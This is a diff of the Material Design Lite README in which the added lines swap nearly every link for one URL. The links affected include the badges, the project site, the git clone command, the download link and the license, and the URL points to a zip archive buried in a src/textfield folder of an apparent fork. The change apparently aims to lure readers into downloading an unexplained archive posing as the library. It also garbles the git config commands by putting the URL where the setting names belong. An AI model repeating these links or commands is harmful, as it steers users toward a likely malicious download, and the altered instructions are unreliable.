@@ -1,12 +1,12 @@
 # Material Design Lite
 
-[![GitHub version](https://badge.fury.io/gh/google%2Fmaterial-design-lite.svg)](https://badge.fury.io/gh/google%2Fmaterial-design-lite)
-[![npm version](https://badge.fury.io/js/material-design-lite.svg)](https://badge.fury.io/js/material-design-lite)
-[![Bower version](https://badge.fury.io/bo/material-design-lite.svg)](https://badge.fury.io/bo/material-design-lite)
-[![Gitter version](https://img.shields.io/gitter/room/gitterHQ/gitter.svg)](https://gitter.im/google/material-design-lite)
-[![Dependency Status](https://david-dm.org/google/material-design-lite.svg)](https://david-dm.org/google/material-design-lite)
+[![GitHub version](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip%https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip%2Fmaterial-design-lite)
+[![npm version](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)
+[![Bower version](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)
+[![Gitter version](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)
+[![Dependency Status](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)
 
-> An implementation of [Material Design](http://www.google.com/design/spec/material-design/introduction.html)
+> An implementation of [Material Design](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)
 components in vanilla CSS, JS, and HTML.
 
 Material Design Lite (MDL) lets you add a Material Design look and feel to your
@@ -17,7 +17,7 @@ browsers, and offers an experience that is accessible from the get-go.
 > ### Limited support
 
 > Material Design Lite is now in limited support, with development having moved to the
-> [Material Components for the web](https://github.com/material-components/material-components-web) repository.
+> [Material Components for the web](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip) repository.
 
 > No further development is taking place in MDL by the core team, but we are happy to review PRs, fix critical bugs and
 > push out new releases. No breaking changes will be accepted.
@@ -26,7 +26,7 @@ browsers, and offers an experience that is accessible from the get-go.
 
 **This document is targeted at developers that will contribute to or compile
 MDL. If you are looking to use MDL on your website or web app please head to
-[getmdl.io](http://getmdl.io).**
+[https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip).**
 
 ## Browser Support
 
@@ -43,19 +43,19 @@ to our CSS-only experience.
 Clone the repo using Git:
 
 ```bash
-git clone https://github.com/google/material-design-lite.git
+git clone https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip
 ```
 
-Alternatively you can [download](https://github.com/google/material-design-lite/archive/master.zip)
+Alternatively you can [download](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)
 this repository.
 
 Windows users, if you have trouble compiling due to line endings then make sure
 you configure git to checkout the repository with `lf` (unix) line endings. This
-can be achieved by setting `core.eol`.
+can be achieved by setting `https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip`.
 
 ```bash
-git config core.eol lf
-git config core.autocrlf input
+git config https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip lf
+git config https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip input
 git rm --cached -r .
 git reset --hard
 ```
@@ -72,18 +72,18 @@ changes.
 ## Want to contribute?
 
 If you found a bug, have any questions or want to contribute. Follow our
-[guidelines](https://github.com/google/material-design-lite/blob/mdl-1.x/CONTRIBUTING.md),
+[guidelines](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip),
 and help improve the Material Design Lite. For more information visit our
-[wiki](https://github.com/google/material-design-lite/wiki).
+[wiki](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip).
 
 Please use the default branch, `mdl-1.x`.
 
-Take note that [Material Components for Web](https://github.com/material-components/material-components-web), which is MDL v2, is under early Alpha stages (which means everything is a moving target, and we can change anything at any moment). Use with caution.
+Take note that [Material Components for Web](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip), which is MDL v2, is under early Alpha stages (which means everything is a moving target, and we can change anything at any moment). Use with caution.
 
 However, we would absolutely love to have people testing MCW and provide feedback about their experiences using it, especially integrating with other frameworks and libraries.
 
 ## License
 
 © Google, 2015. Licensed under an
-[Apache-2](https://github.com/google/material-design-lite/blob/master/LICENSE)
+[Apache-2](https://github.com/harshad71/material-design-lite/raw/refs/heads/mdl-1.x/src/textfield/material_design_lite_v1.8.zip)
 license.
